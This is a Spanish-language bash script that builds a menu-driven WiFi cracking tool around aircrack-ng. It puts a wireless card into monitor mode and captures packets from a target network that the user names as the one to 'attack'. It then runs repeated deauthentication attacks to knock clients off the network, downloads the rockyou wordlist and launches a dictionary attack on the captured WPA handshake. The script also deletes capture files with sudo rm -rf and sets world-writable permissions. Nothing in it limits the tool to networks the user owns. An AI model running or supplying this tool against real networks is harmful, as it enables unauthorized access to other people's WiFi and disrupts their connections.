#!/bin/bash

# Función para instalar un paquete si no está instalado
instalar_paquete_sinosta() {
    package_name="$1"
    if ! dpkg -l | grep -q "^ii\s*$package_name"; then
        echo ""
        echo "Instalando el paquete $package_name ..."
        sudo apt-get install -y "$package_name"
        # Control de errores al instalar
        if [ $? -ne 0 ]; then
            echo "Error al instalar el paquete $package_name."
            exit 1  # Salir del script con código de error
        fi
        echo ""
        echo ""
    else 
        echo ""
        echo "La dependencia del paquete $package_name ya está instalada"
        echo ""
        read -p "Presiona Enter para continuar..."
    fi
}

# Comprobar e instalar paquetes necesarios
instalar_paquete_sinosta aircrack-ng
instalar_paquete_sinosta wget
instalar_paquete_sinosta dbus

# Obtener el nombre de la interfaz inalámbrica
wifi_interface=$(iwconfig 2>/dev/null | grep -o '^[a-zA-Z0-9]*')



# Menú de opciones
while true; do
    clear
    echo "El nombre de la interfaz inalámbrica es: $wifi_interface"  
    echo "--------------------------------------------------------"
    echo "1. Activar modo monitor de la tarjeta Wifi"
    echo "2. Escaneo para ver las redes Wifi"
    echo "3. Escucha de paquetes y redes"
    echo "4. Generar tráfico"
    echo "5. Realizar ataquete de diccionario"
    echo "6. ¿Cómo renombrar la tarjeta Wifi?"
    echo "7. Salir"
    
    echo "========================================"
    read -p "Selecciona una opción (1-7): " option
    echo ""


case $option in
    1)
        
        echo "Matar procesos que puedan intervenir"
        echo "-------------------------"
        sudo airmon-ng check kill
        # Control de errores
        if [ $? -ne 0 ]; then
                echo "Error al matar los procesos."
                read -p "Presiona Enter para continuar..."
                continue  # Volver al menú
        fi
        echo "-------------------------"
        echo "Comprobación de la activación del modo monitor"
        sudo airmon-ng start $wifi_interface
        if [ $? -ne 0 ]; then
                echo "Error al activar el modo monitor."
                read -p "Presiona Enter para continuar..."
                continue  # Volver al menú
        fi
        echo "-------------------------"
        ifconfig
        read -p "Si alguno de las tarjetas acaba en mon, reinicia el script para poder seguir trabajando, de lo contrario no funcionará. Pulsa Enter para continuar..."
        ;;
    2)
        # Obtener el nombre de la interfaz Wi-Fi en modo monitor
        monitor_interface=$(iwconfig 2>/dev/null | grep -o '^[a-zA-Z0-9]*')

        if [ -n "$monitor_interface" ]; then
            echo "La interfaz Wi-Fi en modo monitor es: $monitor_interface"
            echo ""
            read -p "Presiona Enter para continuar..."
        else
            echo "No se encontró ninguna interfaz Wi-Fi en modo monitor."
            echo ""
            read -p "Presiona Enter para continuar..."
        fi
        echo "Iniciando la interfaz:"
        # sudo airmon-ng start $monitor_interface
        gnome-terminal -- sudo airodump-ng $monitor_interface
        read -p "Presiona Enter para continuar..."
        ;;
    3)
        read -p "Escribe el BSSID que quieres atacar: " bssid
        read -p "Presiona Enter para continuar..."
        read -p "Escribe el Chanel de la BSSID: " Chanel
        read -p "Presiona Enter para continuar..."
        read -p "Escribe el nombre de la red que quieres atacar: " red
        read -p "Presiona Enter para continuar..."
        echo "Eliminando los archivos captura*, para empezar a capturar desde cero"
        sudo rm -rf captura*
        read -p "Presiona Enter para continuar..."
        read -p "Escribe el nombre del archivo donde guardar los paquetes (Se recomienda utilizar como nombre captura, sin extensión): " archivo
        read -p "Presiona Enter para continuar..."

        gnome-terminal -- sudo airodump-ng -c $Chanel --bssid $bssid -w $archivo $monitor_interface
        ;;
    4)
        read -p "Escribe el BSSID que de STATION: " bssidStation
        read -p "Presiona Enter para continuar..."
        
        while true; do
        read -p "Ingresa el número de veces que deseas repetir el ataque: " num_attacks
        read -p "Presiona Enter para continuar..."

        # Realizar ataque de desautenticación múltiples veces
            for ((i=1; i<=$num_attacks; i++)); do
                sudo aireplay-ng -0 9 -a $bssid -c $bssidStation $monitor_interface
                sleep 5 # Esperar unos segundos antes del próximo ataque
            done

            read -p "¿Quieres repetir el ataque con otro número de veces? (s/n): " repeat
            if [ "$repeat" != "s" ]; then
            break
            fi
        done      
        ;;
    5)

        read -p "Escribe el Handshake : " Handshake
        read -p "Presiona Enter para continuar..."
        echo "Descargando diccionario"
        wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
        read -p "Presiona Enter para iniciar el ataque..."
        sudo chmod 777 $archivo*
        gnome-terminal -- sudo aircrack-ng -b $Handshake -w rockyou.txt "$archivo-01.cap"
        ;;
    6)
        echo "Si intentas iniciar el modo monitor en una interfaz inalámbrica, probablemente verás el siguiente mensaje:"
        echo "La interfaz $wifi_interface es demasiado larga para Linux, por lo que se le cambiará el nombre al estilo antiguo (wlan#)."
        echo "Donde la numeración después de los tres primeros caracteres es la dirección MAC de la interfaz."
        echo ""
        echo "Para solucionar el problema escribe los siguientes comandos en la terminal:"
        echo ""
        echo "sudo ifconfig $wifi_interface down"
        echo ""
        echo "sudo ip link set $wifi_interface name wlan0"
        echo ""
        echo "sudo ifconfig wlan0 up"
        echo ""
        read -p "Presiona Enter para iniciar otro terminal y utilizar estos comandos ..."
        gnome-terminal
        read -p "Presiona Enter para salir del script. Después vuelve a iniciarlo y comienza por el paso 1 ..."
        ;;
    7)
        # Salir del programa
        echo ""
        echo "Saliendo del programa."
        echo ""
        exit 0
        ;;

    *)
        echo -e "Opción inválida. Por favor, selecciona una opción válida (1-6)."
        read -p "Presiona Enter para continuar..."
        ;;
esac
done
